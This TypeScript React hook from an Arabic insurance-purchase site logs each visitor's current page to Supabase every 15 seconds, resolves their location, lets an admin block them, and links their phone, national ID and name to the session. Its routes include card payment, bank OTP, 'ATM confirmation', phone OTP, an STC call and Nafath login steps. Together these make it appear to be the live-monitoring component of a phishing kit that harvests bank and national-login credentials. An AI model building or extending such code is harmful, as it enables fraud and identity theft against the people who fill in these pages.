import { useEffect, useRef, useCallback, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

const PAGE_NAMES: Record<string, string> = {
  "/": "الصفحة الرئيسية",
  "/about": "من نحن",
  
  "/insurance-request": "طلب تأمين",
  "/insurance/offers": "عروض التأمين",
  "/insurance/compare": "مقارنة العروض",
  "/insurance/checkout": "إتمام الشراء",
  "/insurance/payment": "الدفع بالبطاقة",
  "/insurance/otp": "رمز التحقق البنكي",
  "/insurance/atm": "تأكيد ATM",
  "/insurance/phone-verify": "توثيق الجوال",
  "/insurance/phone-otp": "كود توثيق الجوال",
  "/insurance/phone-stc": "مكالمة STC",
  "/insurance/nafath-login": "دخول نفاذ",
  "/insurance/nafath-verify": "تحقق نفاذ",
  "/insurance/confirmation": "تأكيد الطلب",
  "/verify-policy": "التحقق من الوثيقة",
  "/admin/login": "دخول الأدمن",
  "/admin": "لوحة التحكم",
};

function getPageName(pathname: string): string {
  return PAGE_NAMES[pathname] || pathname;
}

function getSessionId(): string {
  let sid = sessionStorage.getItem("visitor_sid");
  if (!sid) {
    sid = crypto.randomUUID();
    sessionStorage.setItem("visitor_sid", sid);
  }
  return sid;
}

export function useVisitorTracking() {
  const location = useLocation();
  const navigate = useNavigate();
  const sessionId = useRef(getSessionId());
  const intervalRef = useRef<ReturnType<typeof setInterval>>();
  const [isBlocked, setIsBlocked] = useState(false);

  useEffect(() => {
    if (location.pathname.startsWith("/admin")) return;
    if (sessionStorage.getItem("is_admin_session") === "1") return;

    const sid = sessionId.current;
    const pageName = getPageName(location.pathname);
    const geoResolved = sessionStorage.getItem("visitor_geo_resolved");

    const upsert = async () => {
      // Check if user is an authenticated admin
      const { data: { user } } = await supabase.auth.getUser();
      if (user) {
        const { data: roleData } = await supabase
          .from("user_roles")
          .select("role")
          .eq("user_id", user.id)
          .eq("role", "admin")
          .maybeSingle();
        if (roleData) {
          sessionStorage.setItem("is_admin_session", "1");
          // Use RPC to clean up - admin shouldn't be tracked
          await supabase.from("site_visitors").delete().eq("session_id", sid);
          return;
        }
      }

      // Use RPC function instead of direct table access
      const { data, error } = await supabase.rpc("upsert_visitor_tracking", {
        p_session_id: sid,
        p_current_page: pageName,
        p_is_online: true,
      });

      if (!error && data) {
        const result = data as any;
        if (result?.is_blocked) {
          setIsBlocked(true);
        }
      }
    };

    upsert();

    if (!geoResolved) {
      sessionStorage.setItem("visitor_geo_resolved", "1");
      supabase.functions.invoke("resolve-geo", {
        body: { session_id: sid },
      }).catch(() => {});
    }

    intervalRef.current = setInterval(upsert, 15000);

    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [location.pathname]);

  useEffect(() => {
    if (isBlocked && location.pathname !== "/") {
      navigate("/", { replace: true });
    }
  }, [isBlocked, location.pathname, navigate]);

  const linkVisitorData = useCallback(async (data: {
    phone?: string;
    national_id?: string;
    visitor_name?: string;
    linked_request_id?: string;
    linked_conversation_id?: string;
  }) => {
    const sid = sessionId.current;
    // Use RPC function for linking data
    await supabase.rpc("link_visitor_data", {
      p_session_id: sid,
      p_phone: data.phone || null,
      p_national_id: data.national_id || null,
      p_visitor_name: data.visitor_name || null,
    });
  }, []);


  return { linkVisitorData, sessionId: sessionId.current, isBlocked };
}
